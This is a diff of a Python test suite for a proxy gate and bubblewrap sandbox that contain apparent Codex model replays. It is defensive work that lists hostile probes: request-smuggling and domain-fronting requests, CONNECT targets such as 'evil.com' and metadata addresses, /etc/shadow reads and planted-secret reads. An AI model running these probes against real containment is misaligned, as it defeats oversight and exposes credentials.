+            s.sendall(b"POST /backend-api/codex/responses HTTP/1.1\r\nHost: example.com\r\nAuthorization: Bearer dummy\r\n"
+                      b"Content-Length: %d\r\nX-Codex-Beta-Features: remote_compaction_v2\r\nContent-Type: text/plain\r\n"
+                      b"Connection: keep-alive\r\n\r\n%sGET / HTTP/1.1\r\nHost: example.com\r\n\r\n" % (len(sent), sent))
+            provider.settimeout(1)
+            got = b""
+            try:
+                while d := provider.recv(65536):
+                    got += d
+            except socket.timeout:
+                pass
+            self.assertTrue(got.startswith(b"POST /backend-api/codex/responses HTTP/1.1\r\nHost: chatgpt.com\r\n"), got)
+            body = json.dumps(CODEX_TURN, ensure_ascii=False).encode()
+            self.assertTrue(got.endswith(b"\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s"
+                                         % (len(body), body)), got[-300:])
+            self.assertNotIn(b"text/plain", got)                               # the gate's Content-Type, not the sandbox's
+            self.assertNotIn(b"example.com", got)                              # neither its Host nor the pipelined request
+            self.assertIn(b"\r\nAuthorization: Bearer real-T\r\n", got)        # the gate's token, not the sandbox's
+            self.assertNotIn(b"dummy", got)
+            provider.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
+            provider.close()
+            self.assertIn(b"200 OK", s.recv(200))
         self.assertFalse(gate.dir.exists())
 
+    def exchange(self, gate: rp.Gate, request: bytes, reply: bytes = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"):
+        """One request through the gate to a stand-in provider: what the provider received (b"" if the gate
+        refused) and what the client got back."""
+        up, provider = socket.socketpair()
+        gate.upstream = lambda: up
+        s = self.tunnel(gate, rp.PROVIDER)
+        s.sendall(request)
+        provider.settimeout(0.5)
+        got = b""
+        try:
+            while b"\r\n\r\n" not in got or len(got.partition(b"\r\n\r\n")[2]) < int(
+                    re.search(rb"Content-Length: (\d+)", got).group(1) if b"Content-Length" in got else 0):
+                if not (d := provider.recv(65536)):
+                    break
+                got += d
+            provider.sendall(reply)
+        except socket.timeout:
+            pass
+        provider.close()
+        return got, s.recv(300)
 
-@unittest.skipUnless(shutil.which("bwrap"), "bubblewrap not installed")
+    def test_a_turn_state_passes_only_as_the_provider_issued_it_to_this_run(self):
+        turn = json.dumps(CODEX_TURN).encode()
+        post = b"POST /backend-api/codex/responses HTTP/1.1\r\nX-Codex-Turn-State: %s\r\nContent-Length: %d\r\n\r\n%s"
+        with rp.Gate(token="T") as gate, rp.Gate(token="T") as other:
+            sent, _ = self.exchange(gate, post.replace(b"X-Codex-Turn-State: %s\r\n", b"") % (len(turn), turn),
+                                    b"HTTP/1.1 200 OK\r\nx-codex-turn-state: ts.A-1/=\r\nContent-Length: 0\r\n\r\n")
+            self.assertTrue(sent)
+            self.assertEqual(gate.turn_states, {"ts.A-1/="})                   # issued by the provider
+            sent, _ = self.exchange(gate, post % (b"ts.A-1/=", len(turn), turn))
+            self.assertIn(b"\r\nX-Codex-Turn-State: ts.A-1/=\r\n", sent)     # echoed as issued: forwarded
+            for g, req in ((gate, post % (b"ts.A-1/=x", len(turn), turn)),     # forged
+                           (gate, post % (b"ts.A-1", len(turn), turn)),        # a prefix of the issued value
+                           (gate, b"GET /backend-api/codex/models?client_version=1 HTTP/1.1\r\n"
+                                  b"X-Codex-Turn-State: ts.A-1/=\r\n\r\n"),    # on a GET
+                           (other, post % (b"ts.A-1/=", len(turn), turn))):    # issued in another run
+                sent, back = self.exchange(g, req)
+                self.assertEqual(sent, b"", req[:80])
+                self.assertIn(b"X-Replay-Gate: refused", back)
+            for value in (b"x" * 2049, b"a b"):                                # too long, or not one visible token
+                self.exchange(other, post.replace(b"X-Codex-Turn-State: %s\r\n", b"") % (len(turn), turn),
+                              b"HTTP/1.1 200 OK\r\nx-codex-turn-state: %s\r\nContent-Length: 0\r\n\r\n" % value)
+            self.assertEqual(other.turn_states, set())
+            self.assertEqual([e["request"] for e in gate.log if not e["allowed"]],
+                             ["POST /backend-api/codex/responses (header)"] * 2 + ["GET /backend-api/codex/models (header)"])
+
+    def test_a_gate_with_model_turns_off_refuses_every_post_and_makes_no_call(self):
+        turn = json.dumps(CODEX_TURN).encode()
+        post = b"POST /backend-api/codex/responses HTTP/1.1\r\nContent-Length: %d\r\n\r\n%s" % (len(turn), turn)
+        with rp.Gate(token="T", model_turns=False) as gate:
+            sent, back = self.exchange(gate, post)
+            self.assertEqual(sent, b"")
+            self.assertIn(b"X-Replay-Gate: refused", back)
+            sent, _ = self.exchange(gate, b"GET /backend-api/codex/models?client_version=1 HTTP/1.1\r\n\r\n")
+            self.assertTrue(sent)                                               # the other routes stay as they are
+            self.assertEqual(gate.summary()["denied"], ["POST /backend-api/codex/responses (model turns off)"])
+            self.assertEqual(gate.requests, 1)
+        with rp.Gate(token="T") as gate:
+            self.assertTrue(self.exchange(gate, post)[0])                      # the default forwards the turn
+
+    def test_everything_else_is_refused(self):
+        with rp.Gate() as gate, mock.patch.object(rp.Gate, "BODY_WAIT", 0.5):
+            for data in (b"CONNECT example.com:443 HTTP/1.1\r\n\r\n", b"CONNECT chatgpt.com:80 HTTP/1.1\r\n\r\n",
+                         b"GET http://example.com/ HTTP/1.1\r\n\r\n", b"GET /backend-api/codex/models HTTP/1.1\r\n\r\n",
+                         b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03"):
+                self.assertIn(b"X-Replay-Gate: refused", self.raw(gate, data), data)
+            for sni in ("example.com", "cloudflare.com"):                       # domain fronting
+                with self.assertRaises(ssl.SSLError):
+                    self.tunnel(gate, sni).sendall(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
+            web = b'{"model": "m", "input": [], "tools": [{"type": "web_search"}], "tools": []}'
+            image = json.dumps(codex_turn(part({"type": "input_image", "image_url": "https://example.com/x"}))).encode()
+            ok = json.dumps(CODEX_TURN).encode()
+            post = b"POST /backend-api/codex/responses HTTP/1.1\r\n%sContent-Length: %d\r\n\r\n%s"
+            for req in (b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n",
+                        b"GET /backend-api/codex/models HTTP/1.1\r\nX-A: a\nHost: example.com\r\n\r\n",
+                        b"GET /backend-api/codex/models HTTP/1.1\r\nX-A: a\x00b\r\n\r\n",
+                        b"GET /backend-api/codex/models HTTP/1.1\r\nX A: b\r\n\r\n",
+                        b"GET /backend-api/codex/models HTTP/1.1\r\njunk-line\r\n\r\n",
+                        b"GET /backend-api/codex/models HTTP/1.1\r\nX-T: a\r\n b\r\n\r\n",
+                        b"GET /backend-api/codex/models HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
+                        b"GET /backend-api/codex/models HTTP/1.1\r\nContent-Length: 2\r\n\r\n{}",
+                        b"POST /backend-api/codex/responses HTTP/1.1\r\nContent-Length: %d\r\n\r\n%s" % (len(web), web),
+                        b"POST /backend-api/codex/responses HTTP/1.1\r\nContent-Encoding: zstd\r\nContent-Length: 2\r\n\r\n{}",
+                        b"POST /backend-api/codex/responses HTTP/1.1\r\nContent-Length: %d\r\n\r\n" % (rp.BODY_CAP + 1),
+                        post % (b"", len(image), image),                                  # an image the provider fetches
+                        post % (b"", len(ok) - 5, ok), post % (b"", len(ok) + 50, ok),    # a Content-Length off the body
+                        post % (b"Content-Length: 2\r\n", len(ok), ok),                   # two of them
+                        post % (b"X-Forwarded-Host: example.com\r\n", len(ok), ok),       # a header Codex never sends
+                        post % (b"X-Codex-Beta-Features: remote_compaction_v2, web_search\r\n", len(ok), ok),
+                        b"POST /backend-api/codex/responses?x=1 HTTP/1.1\r\nContent-Length: 2\r\n\r\n{}",
+                        b"GET /backend-api/codex/models?client_version=0.0.0&q=1 HTTP/1.1\r\n\r\n",
+                        b"GET /backend-api/wham/accounts/check?x=1 HTTP/1.1\r\n\r\n",
+                        b"GET /backend-api/codex/models/ HTTP/1.1\r\n\r\n"):
+                s = self.tunnel(gate, rp.PROVIDER)
+                s.sendall(req)
+                self.assertIn(b"X-Replay-Gate: refused", s.recv(300), req)
+            time.sleep(0.2)
+            self.assertFalse(any(e["allowed"] for e in gate.log))
+            self.assertEqual(sum(e["request"].startswith("TLS refused") for e in gate.log), 2)
+
+    def test_a_run_has_a_request_and_byte_budget(self):
+        with rp.Gate(token="T") as gate:
+            gate.upstream = lambda: socket.socketpair()[0]  # never reached
+            gate.requests = rp.GATE_REQUESTS
+            s = self.tunnel(gate, rp.PROVIDER)
+            s.sendall(b"GET /backend-api/codex/models HTTP/1.1\r\n\r\n")
+            self.assertIn(b"X-Replay-Gate: refused", s.recv(300))
+            gate.requests, gate.bytes = 0, rp.GATE_BYTES
+            s = self.tunnel(gate, rp.PROVIDER)
+            s.sendall(b"GET /backend-api/codex/models HTTP/1.1\r\n\r\n")
+            self.assertIn(b"X-Replay-Gate: refused", s.recv(300))
+            time.sleep(0.2)
+            self.assertEqual([e["request"] for e in gate.log], ["GET /backend-api/codex/models (budget)"] * 2)
+
+    def test_the_provider_must_resolve_to_public_addresses(self):
+        for addr in ("127.0.0.1", "10.1.2.3", "::1", "169.254.169.254"):
+            with mock.patch.object(rp.socket, "getaddrinfo", return_value=[(0, 0, 0, "", (addr, 443))]):
+                with self.assertRaisesRegex(OSError, "non-public"):
+                    rp.Gate.upstream()
+
+
+@unittest.skipUnless(shutil.which("bwrap") and shutil.which("openssl"), "bubblewrap or openssl not installed")
 class Sandbox(unittest.TestCase):
-    """The sandbox every replay runs in, driven with shell probes instead of a model."""
+    """The sandbox every replay runs in, driven with shell probes and the hostile review's probes (p1-p4)
+    instead of a model."""
 
     def setUp(self):
         base = Path.home() / ".vrooli/tmp"
@@ -561,15 +1015,23 @@ class Sandbox(unittest.TestCase):
     def tearDown(self):
         self.tmp.cleanup()
 
-    def run_in(self, shell: str, **kw) -> subprocess.CompletedProcess:
-        cmd = rp.sandbox_cmd(["bash", "-c", shell], ws=self.ws, variant="old", cohort="c1", **kw)
-        return subprocess.run(cmd, capture_output=True, text=True, timeout=60, env=rp.sandbox_env(proxy=False))
+    def run_in(self, shell: str) -> subprocess.CompletedProcess:
+        cmd = rp.sandbox_cmd(["bash", "-c", shell], ws=self.ws, variant="old", cohort="c1")
+        return subprocess.run(cmd, capture_output=True, text=True, timeout=60, env=rp.sandbox_env())
 
-    def test_every_write_outside_tmp_is_refused(self):
+    def drive(self, code: str, gate: rp.Gate) -> list[str]:
+        """Run Python as the one turn DRIVER runs (gate, Codex home tmpfs, login copy); its output lines."""
+        cmd = rp.sandbox_cmd(rp.DRIVE, ws=self.ws, variant="old", cohort="c1", gate=gate)
+        p = subprocess.run(cmd, input=json.dumps(rp.codex_header([["python3", "-I", "-c", code]])) + "\n",
+                           capture_output=True, text=True, timeout=120, env=rp.sandbox_env())
+        return [x for x in p.stdout.splitlines() if not x.startswith('{"replay"')]
+
+    def test_every_write_outside_the_capped_tmpfs_is_refused(self):
         probe = f".replay-test-probe-{os.getpid()}"
-        for target in (rp.REPO / probe, rp.RESEARCH / probe, rp.RESEARCH / "cohorts/c1" / probe, rp.SKILLS / probe,
-                       Path.home() / probe, Path.home() / ".vrooli/state" / probe, Path.home() / ".vrooli/bin" / probe,
-                       rp.EFFORT_DIR / probe):
+        for target in (rp.REPO / probe, rp.RESEARCH / probe, rp.RESEARCH / "cohorts" / probe, rp.RESEARCH / "cohorts/c1" / probe,
+                       rp.SKILLS / probe, Path.home() / probe, Path.home() / ".vrooli/state" / probe,
+                       Path.home() / ".vrooli/bin" / probe, rp.EFFORT_DIR / probe, Path("/") / probe, Path("/dev") / probe,
+                       Path("/etc") / probe):
             p = self.run_in(f"echo x > '{target}'")
             self.assertNotEqual(p.returncode, 0, target)
             self.assertFalse(target.exists(), target)
@@ -577,18 +1039,17 @@ class Sandbox(unittest.TestCase):
         self.assertEqual(p.stdout.strip(), "ok")
         self.assertFalse(Path("/tmp/replay-private-probe").exists())
 
-    def test_the_variant_and_snapshot_appear_at_the_real_paths(self):
+    def test_the_variant_and_snapshot_appear_at_the_real_paths_and_nothing_else(self):
         p = self.run_in(f"cat '{rp.SKILLS}/research-coordination/SKILL.md' '{rp.RESEARCH}/cohorts/c1/README.md' "
-                        f"'{rp.RESEARCH}/topics/alpha/MISSION.md'; ls '{rp.EFFORT_DIR}' | wc -l; "
-                        f"ls '{rp.SKILLS}/research-review' 2>&1 | head -1; prompt-manager skill read other-skill")
-        self.assertIn("Research coordination old", p.stdout)
-        self.assertIn("charter old", p.stdout)
-        self.assertIn("\n0\n", p.stdout)                                        # the effort folder is empty
-        self.assertIn("No such file", p.stdout)                                 # the harness is not there
-        self.assertIn("Other skill body", p.stdout)
+                        f"'{rp.RESEARCH}/topics/alpha/MISSION.md' '{rp.REPO}/scenarios/a/api/main.go'; "
+                        f"ls '{rp.EFFORT_DIR}' '{rp.SKILLS}/research-review' 2>&1; prompt-manager skill read other-skill; "
+                        "ls /etc | wc -l; test -e /etc/shadow; echo shadow=$?")
+        for text in ("Research coordination old", "charter old", "package main", "Other skill body", "shadow=1"):
+            self.assertIn(text, p.stdout)
+        self.assertEqual(p.stdout.count("No such file"), 2)                    # no effort folder, no harness
+        self.assertLessEqual(int(p.stdout.splitlines()[-2]), len(rp.ETC_ALLOW))
 
     def test_services_and_host_sockets_are_unreachable(self):
-        import socket
         srv = socket.socket()
         srv.bind(("127.0.0.1", 0))
         srv.listen(1)
@@ -617,6 +1078,83 @@ class Sandbox(unittest.TestCase):
             del os.environ["VROOLI_AGENT_IDENTITY_TOKEN"]
         self.assertNotIn("secret", p.stdout)
         self.assertIn(f"CODEX_HOME={Path.home()}/.codex", p.stdout)
+
+    def test_p1_only_the_capped_tmpfs_mounts_are_writable(self):
+        with rp.Gate() as gate:
+            out = self.drive("import os\nprint(len(os.listdir('/proc/self/fd')))\n"
+                             "for l in open('/proc/self/mountinfo'):\n"
+                             "    f = l.split()\n"
+                             "    if f[5].startswith('rw') and f[-3] != 'proc' and f[4] not in ('/dev/pts',) "
+                             "and not f[4].startswith('/dev/') or f[4] == '/dev/shm':\n"
+                             "        print(f[4], f[-3], os.statvfs(f[4]).f_blocks * os.statvfs(f[4]).f_frsize)", gate)
+        self.assertLessEqual(int(out[0]), 4)
+        self.assertEqual(sorted(x.split()[:2] for x in out[1:]),
+                         sorted([["/dev/shm", "tmpfs"], ["/tmp", "tmpfs"], [str(Path.home() / ".codex"), "tmpfs"]]))
+        caps = {x.split()[0]: int(x.split()[2]) for x in out[1:]}
+        self.assertEqual(caps, {"/dev/shm": rp.SHM_CAP, "/tmp": rp.TMP_CAP, str(Path.home() / ".codex"): rp.CODEX_HOME_CAP})
+
+    def test_p2_p3_writes_and_the_review_secrets_fail_inside(self):
+        targets = [str(rp.REPO / "x"), str(Path.home() / ".vrooli/x"), str(rp.RESEARCH / "x"), "/run/x", "/var/x", "/usr/x",
+                   "/etc/x", str(Path.home() / ".codex/plugins/x")] + [str(rp.REPO / r) for r in PLANTED]
+        code = ("import json, sys\nout = {}\nfor p in json.loads(sys.argv[1]):\n"
+                "    try:\n        open(p, 'a' if p.endswith('/x') else 'r').close(); out[p] = 'OPENED'\n"
+                "    except OSError as e:\n        out[p] = e.strerror\nprint(json.dumps(out))")
+        with rp.Gate() as gate:
+            out = self.drive(code.replace("sys.argv[1]", repr(json.dumps(targets))), gate)
+        got = json.loads(out[-1])
+        self.assertEqual([p for p, r in got.items() if r == "OPENED"], [])
+
+    def test_p4_connect_targets_and_domain_fronting_are_refused_inside(self):
+        code = r"""
+import json, socket, ssl
+out = {}
+def conn(t):
+    s = socket.create_connection(("127.0.0.1", %d), timeout=15)
+    s.sendall(("CONNECT %%s HTTP/1.1\r\nHost: %%s\r\n\r\n" %% (t, t)).encode())
+    return s, s.recv(300).decode("latin1").split("\r\n")[0]
+for t in ["CHATGPT.COM:443", "chatgpt.com.:443", "chatgpt.com:80", "x.chatgpt.com:443", "localhost.chatgpt.com:443",
+          "evil.com#.chatgpt.com:443", "[::1]:443", "2130706433:443", "0x7f000001:443", "localhost:443",
+          "chatgpt.com@evil.com:443", "evil.com:443", "ab.chatgpt.com:443"]:
+    s, r = conn(t); out[t] = r; s.close()
+for sni, host in [("example.com", "example.com"), ("cloudflare.com", "www.cloudflare.com"), ("chatgpt.com", "example.com")]:
+    try:
+        s, r = conn("chatgpt.com:443")
+        t = ssl.create_default_context().wrap_socket(s, server_hostname=sni)
+        t.sendall(("GET / HTTP/1.1\r\nHost: %%s\r\nConnection: close\r\n\r\n" %% host).encode())
+        out["front " + sni + " " + host] = t.recv(400).decode("latin1")
+    except Exception as e:
+        out["front " + sni + " " + host] = "ERR " + type(e).__name__
+print(json.dumps(out))
+""" % rp.PROXY_PORT
+        with rp.Gate() as gate:
+            got = json.loads(self.drive(code, gate)[-1])
+            log = gate.summary()
+        for t, r in got.items():
+            self.assertTrue(r.startswith("ERR") or "X-Replay-Gate: refused" in r or r == "HTTP/1.1 403 Forbidden", (t, r))
+        self.assertEqual(log["allowed"], {})
+
+    def test_no_login_copy_is_ever_written_to_the_host(self):
+        self.assertFalse(hasattr(rp, "make_codex_home"))
+        replay_tmp = Path.home() / ".vrooli/tmp/research-replay"
+        before = set(os.listdir(replay_tmp)) if replay_tmp.is_dir() else set()
+        code = ("import json, os, stat\nh = os.environ['CODEX_HOME']\na = json.load(open(h + '/auth.json'))\n"
+                "print(json.dumps({'refresh': a.get('tokens', {}).get('refresh_token'), "
+                "'mode': oct(stat.S_IMODE(os.stat(h + '/auth.json').st_mode)), 'fs': [l.split()[-3] for l in "
+                "open('/proc/self/mountinfo') if l.split()[4] == h]}))")
+        with rp.Gate() as gate:
+            gate_dir = gate.dir
+            files_in_gate = []
+            out = self.drive(code, gate)
+            files_in_gate = sorted(p.name for p in gate.dir.iterdir())
+        got = json.loads(out[-1])
+        self.assertEqual(got["fs"], ["tmpfs"])                                  # the login copy lives in the sandbox's tmpfs
+        self.assertEqual(got["mode"], "0o600")
+        if (Path.home() / ".codex/auth.json").exists():
+            self.assertEqual(got["refresh"], "")
+        self.assertNotIn("auth.json", files_in_gate)
+        self.assertFalse(gate_dir.exists())
+        self.assertEqual(set(os.listdir(replay_tmp)) if replay_tmp.is_dir() else set(), before)
+
 
 if __name__ == "__main__":
     unittest.main()
